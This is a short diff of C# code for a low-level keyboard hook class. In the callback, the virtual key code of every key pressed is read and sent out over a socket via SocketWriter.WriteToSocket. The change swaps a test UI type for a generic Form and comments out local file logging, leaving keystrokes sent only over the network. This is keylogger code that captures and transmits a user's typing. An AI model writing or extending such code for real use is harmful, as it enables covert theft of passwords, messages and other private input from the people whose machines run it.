@@ -21,10 +21,10 @@ namespace IP
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool _disposed = false;
         private static string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-        private static TestUI _ui;
+        private static Form _ui;
         private static LoggerWriter _log;
 
-        public LLKeyboardHook(TestUI ui, LoggerWriter log)
+        public LLKeyboardHook(Form ui, LoggerWriter log)
         {
             _log = log; 
             _ui = ui;
@@ -62,7 +62,7 @@ namespace IP
                 /* Extract the virtual key code of the pressed key */
                 int vkCode = Marshal.ReadInt32(lParam);
                 SocketWriter.WriteToSocket(vkCode.ToString());
-                _log.HandleVK(vkCode, docPath, _ui);
+                //_log.HandleVK(vkCode, docPath, _ui);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
